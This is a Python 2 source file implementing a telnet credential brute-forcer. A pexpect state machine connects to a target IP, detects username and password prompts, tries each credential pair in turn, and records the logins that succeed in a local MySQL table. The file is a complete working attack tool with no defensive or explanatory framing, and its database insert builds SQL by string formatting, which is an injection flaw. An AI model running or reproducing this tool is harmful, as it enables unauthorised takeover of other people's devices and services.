import pexpect
import MySQLdb


class Connection:
    def __init__(self,ip,auth_pair):
        self.new_state(conn_state)
        self.auth_pair = auth_pair
        self.ip = ip
        self.index = 0
        self.child = None


    def new_state(self,newstate):
        self._state = newstate

    def run(self):
        self._state._run(self)

    def exit(self):
        if self.child:
            self.child.close(force=True)

class conn_state:
    @staticmethod
    def _run(conn):
        try:
            conn.child = pexpect.spawn("telnet %s" % conn.ip)
            index = conn.child.expect(["sername","nter","ccount","ogin","eject",pexpect.TIMEOUT,pexpect.EOF],timeout=10)
            if index < 4:
                print "Got flag %s" % conn.ip
                conn.new_state(user_state)
            else:
                conn.new_state(None)
        except:
            conn.new_state(None)

class user_state:
    @staticmethod
    def _run(conn):
        if conn.auth_pair[conn.index][0]:
            user = conn.auth_pair[conn.index][0]
        else:
            conn.new_state(None)
            return
        conn.child.sendline(user)
        index = conn.child.expect(["ssword","sername","nter","ccount",pexpect.TIMEOUT,pexpect.EOF],timeout=10)
        if index == 0:
            conn.new_state(passwd_state)
        elif index < 4:
            conn.new_state(user_state)
            conn.index = conn.index + 1
        else:
            conn.new_state(None)

class passwd_state:
    @staticmethod
    def _run(conn):
        if conn.auth_pair[conn.index][1]:
            passwd = conn.auth_pair[conn.index][1]
        else:
            conn.new_state(None)
            return
        conn.child.sendline(passwd)
        index = conn.child.expect(["ssword","sername","nter","ccount",pexpect.TIMEOUT,pexpect.EOF],timeout=10)
        if index == 4:
            print "Got password %s:%s-%s" % (conn.ip,conn.auth_pair[conn.index][0],passwd)
            conn.new_state(confirm_state)
        elif index == 0:
            conn.new_state(conn_state)
            conn.index = conn.index + 1
        elif index < 4:
            conn.new_state(user_state)
            conn.index = conn.index + 1

class confirm_state:
    @staticmethod
    def _run(conn):
        try:
            user,passwd = conn.auth_pair[conn.index]
            db = MySQLdb.connect("localhost","root","","auth",charset="utf8")
            cursor = db.cursor()
            cursor.execute("INSERT INTO auth_table(ip,port,username,password) values('%s','%d','%s','%s')" % (conn.ip,23,user,passwd,))
            db.commit()
            print "[report] One result import to database"
        except:
            db.rollback()
        conn.new_state(None)
